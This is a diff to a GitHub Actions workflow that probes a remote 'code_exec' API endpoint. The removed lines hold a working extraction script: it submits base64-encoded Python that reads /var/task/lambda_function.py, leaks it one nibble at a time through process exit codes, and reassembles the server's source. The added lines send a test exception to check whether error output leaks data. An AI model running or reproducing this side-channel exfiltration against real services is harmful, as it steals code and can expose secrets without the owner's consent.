@@ -1,4 +1,4 @@
-name: Stage2-CodeExec-Source-Read
+name: Stage2-CodeExec-Exception-Test
 
 on:
   push:
@@ -10,7 +10,7 @@ permissions:
   contents: read
 
 jobs:
-  source:
+  test:
     runs-on: ubuntu-latest
 
     env:
@@ -20,22 +20,24 @@ jobs:
       AWS_DEFAULT_REGION: us-east-1
 
     steps:
-      - name: Extract code_exec source
+      - name: Test exception output channel
         shell: bash
         run: |
           set +e
 
-          python3 -m pip install requests requests-aws4auth boto3 --quiet
+          python3 -m pip install boto3 requests requests-aws4auth --quiet
 
           python3 - <<'PY'
           import base64
-          import re
+          import time
           import requests
           import boto3
           from requests_aws4auth import AWS4Auth
 
           API = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"
-          MAX_BYTES = 512
+
+          code = 'raise Exception("CHANNEL_TEST_123")'
+          encoded = base64.b64encode(code.encode()).decode()
 
           credentials = boto3.Session().get_credentials().get_frozen_credentials()
 
@@ -47,58 +49,13 @@ jobs:
               session_token=credentials.token
           )
 
-          def read_nibble(index, shift):
-              code = (
-                  "p='/var/task/lambda_function.py'; "
-                  "d=open(p,'rb').read(); "
-                  "b=d[" + str(index) + "] if " + str(index) + "<len(d) else 0; "
-                  "raise SystemExit(20+((b>>" + str(shift) + ")&15))"
-              )
+          response = requests.post(
+              API,
+              json={"code": encoded},
+              auth=auth,
+              timeout=20
+          )
 
-              encoded = base64.b64encode(code.encode()).decode()
-
-              response = requests.post(
-                  API,
-                  json={"code": encoded},
-                  auth=auth,
-                  timeout=20
-              )
-
-              match = re.search(
-                  r"exit status:?\s*(\d+)",
-                  response.text
-              )
-
-              if not match:
-                  return None
-
-              return int(match.group(1)) - 20
-
-          recovered = bytearray()
-
-          for index in range(MAX_BYTES):
-              low = read_nibble(index, 0)
-              high = read_nibble(index, 4)
-
-              if low is None or high is None:
-                  print("STOP_INDEX=" + str(index))
-                  break
-
-              value = (high << 4) | low
-
-              if value == 0:
-                  print("STOP_INDEX=" + str(index))
-                  break
-
-              recovered.append(value)
-
-              print(
-                  "INDEX=%d BYTE=%d CHAR=%r"
-                  % (index, value, chr(value)),
-                  flush=True
-              )
-
-          print("SOURCE_TEXT_BEGIN")
-          print(recovered.decode("utf-8", errors="replace"))
-          print("SOURCE_TEXT_END")
+          print("HTTP=" + str(response.status_code))
+          print(response.text)
           PY
